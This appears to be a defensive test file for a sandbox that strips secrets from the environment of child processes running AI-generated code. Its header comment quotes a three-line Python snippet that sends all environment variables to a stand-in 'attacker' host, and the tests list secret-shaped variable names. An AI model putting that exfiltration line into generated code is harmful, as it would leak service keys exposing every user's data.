import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { childEnv, looksSecret, canExecute, spawnSandboxed, ExecutionBlocked } from "../src/services/sandbox.js";

// THE HOLE THIS CLOSES
//
// The Flask preview spawned generated Python with
// `env: { ...process.env, PORT }`, which handed the child every secret
// the server holds — including SUPABASE_SERVICE_KEY, which bypasses
// row-level security and can read and write every project belonging to
// every user.
//
// Three lines of generated Python would have taken all of it:
//
//     import os, urllib.request
//     urllib.request.urlopen("https://attacker/", data=str(os.environ).encode())
//
// "Sandboxed" was true of the browser iframe and false of the server.

const SECRETS = {
  ANTHROPIC_API_KEY: "sk-ant-secret",
  SUPABASE_SERVICE_KEY: "service-role-secret",
  SUPABASE_URL: "https://example.supabase.co",
  OPENAI_API_KEY: "sk-openai",
  NETLIFY_TOKEN: "netlify-secret",
  ACCESS_PASSWORD: "hunter2",
  GOOGLE_API_KEY: "google-secret",
};

function withSecrets<T>(fn: () => T): T {
  const saved: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(SECRETS)) {
    saved[k] = process.env[k];
    process.env[k] = v;
  }
  try { return fn(); }
  finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k]; else process.env[k] = v;
    }
  }
}

test("no secret from our environment reaches a child", () => {
  withSecrets(() => {
    const env = childEnv({ PORT: "5000" });
    for (const name of Object.keys(SECRETS)) {
      assert.ok(!(name in env), `${name} leaked into the child environment`);
    }
  });
});

test("nothing secret-shaped survives, whatever it is called", () => {
  // The allowlist already guarantees this. The assertion is the belt to
  // its braces: it fails if someone ever adds a passthrough.
  withSecrets(() => {
    const env = childEnv({ PORT: "5000" });
    const leaked = Object.keys(env).filter(looksSecret);
    assert.deepEqual(leaked, [], "secret-shaped variables in the child environment");
  });
});

test("the child gets what it genuinely needs", () => {
  const env = childEnv({ PORT: "5000" });
  assert.ok(env["PATH"], "without PATH nothing can be spawned at all");
  assert.equal(env["PORT"], "5000");
});

test("a caller cannot smuggle a secret through the extras", () => {
  // The back door: env: { SUPABASE_SERVICE_KEY: process.env.X }.
  assert.throws(() => childEnv({ SUPABASE_SERVICE_KEY: "x" }), /Refusing to pass/);
  assert.throws(() => childEnv({ MY_API_TOKEN: "x" }), /Refusing to pass/);
  assert.throws(() => childEnv({ db_password: "x" }), /Refusing to pass/);
});

test("the secret pattern catches the shapes that matter", () => {
  for (const n of [
    "ANTHROPIC_API_KEY", "SUPABASE_SERVICE_KEY", "NETLIFY_TOKEN",
    "ACCESS_PASSWORD", "DATABASE_CONNECTION_STRING", "SENTRY_DSN",
    "aws_secret_access_key", "GITHUB_TOKEN",
  ]) {
    assert.ok(looksSecret(n), `${n} should be treated as secret`);
  }
  for (const n of ["PATH", "HOME", "PORT", "LANG", "NODE_ENV"]) {
    assert.ok(!looksSecret(n), `${n} is not a secret`);
  }
});

// ── Execution is a capability, not a default ────────────────

function withEnv<T>(vars: Record<string, string | undefined>, fn: () => T): T {
  const saved: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(vars)) {
    saved[k] = process.env[k];
    if (v === undefined) delete process.env[k]; else process.env[k] = v;
  }
  try { return fn(); }
  finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k]; else process.env[k] = v;
    }
  }
}

test("a single-operator instance may run code", () => {
  withEnv({ ALLOW_CODE_EXECUTION: undefined, SUPABASE_URL: undefined, SUPABASE_ANON_KEY: undefined }, () => {
    assert.equal(canExecute().allowed, true);
  });
});

test("accounts mode refuses by default", () => {
  // This is the gate. One person's generated code must not run beside
  // everyone else's data in a shared process.
  withEnv({
    ALLOW_CODE_EXECUTION: undefined,
    SUPABASE_URL: "https://x.supabase.co",
    SUPABASE_ANON_KEY: "anon",
  }, () => {
    const v = canExecute();
    assert.equal(v.allowed, false);
    assert.match((v as { reason: string }).reason, /user accounts/i);
    // And it must explain what still works, or it reads as a breakage.
    assert.match((v as { reason: string }).reason, /React and web projects still preview/i);
  });
});

test("the override is explicit and auditable", () => {
  withEnv({
    ALLOW_CODE_EXECUTION: "true",
    SUPABASE_URL: "https://x.supabase.co",
    SUPABASE_ANON_KEY: "anon",
  }, () => {
    assert.equal(canExecute().allowed, true);
  });
});

test("it can be switched off even for a single operator", () => {
  withEnv({ ALLOW_CODE_EXECUTION: "false", SUPABASE_URL: undefined, SUPABASE_ANON_KEY: undefined }, () => {
    assert.equal(canExecute().allowed, false);
  });
});

test("spawning refuses when execution is not allowed", () => {
  withEnv({ ALLOW_CODE_EXECUTION: "false" }, () => {
    assert.throws(
      () => spawnSandboxed("node", ["-e", "1"], { cwd: os.tmpdir() }),
      ExecutionBlocked
    );
  });
});

// ── The real thing: run a process and read its environment ──

test("a spawned process genuinely cannot see the secrets", async () => {
  // Every assertion above is about our own function. This one runs an
  // actual child and asks IT what it can see, which is the only version
  // of the question that matters.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "cp-sandbox-"));
  fs.writeFileSync(
    path.join(dir, "probe.js"),
    "console.log(JSON.stringify(Object.keys(process.env)));"
  );

  const names = await withSecrets(() =>
    withEnv({ ALLOW_CODE_EXECUTION: "true" }, async () => {
      const child = spawnSandboxed(process.execPath, ["probe.js"], { cwd: dir, timeoutMs: 20_000 });
      let out = "";
      child.stdout?.on("data", (d: Buffer) => (out += d.toString()));
      await new Promise((r) => child.on("close", r));
      return JSON.parse(out || "[]") as string[];
    })
  );

  assert.ok(names.length > 0, "the probe produced no output");
  for (const secret of Object.keys(SECRETS)) {
    assert.ok(!names.includes(secret), `the child could read ${secret}`);
  }
  assert.ok(names.some((n) => n === "PATH" || n === "Path"), "PATH should still be there");
  fs.rmSync(dir, { recursive: true, force: true });
});

// ── Call sites ──────────────────────────────────────────────

const RUNNER = fs.readFileSync(new URL("../src/services/runner.ts", import.meta.url), "utf8");
const BUILD = fs.readFileSync(new URL("../src/services/build.ts", import.meta.url), "utf8");

test("nothing spawns generated code except through the sandbox", () => {
  for (const [name, src] of [["runner", RUNNER], ["build", BUILD]] as const) {
    assert.doesNotMatch(code(src), /(?<!spawnSandboxed|\w)\bspawn\(/,
      `${name}.ts calls spawn() directly — it must go through spawnSandboxed`);
  }
});

/** Source with comments removed — a comment describing the old bug is
 *  documentation, not the bug. */
function code(src: string): string {
  return src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
}

test("process.env is never spread into a child", () => {
  // The exact shape of the original bug.
  for (const [name, src] of [["runner", RUNNER], ["build", BUILD]] as const) {
    assert.doesNotMatch(code(src), /\.\.\.process\.env/, `${name}.ts still spreads process.env`);
  }
});

test("the preview reports the block instead of failing mid-boot", () => {
  assert.match(RUNNER, /const verdict = canExecute\(\);/);
  assert.match(RUNNER, /this\.state = "error";\s*\n\s*this\.message = verdict\.reason;/);
});

test("stopping kills the whole process group", () => {
  // npm and Vite spawn their own children; a plain kill leaves them
  // holding the port, and the next preview cannot bind it.
  assert.match(RUNNER, /killTree\(this\.child\)/);
});
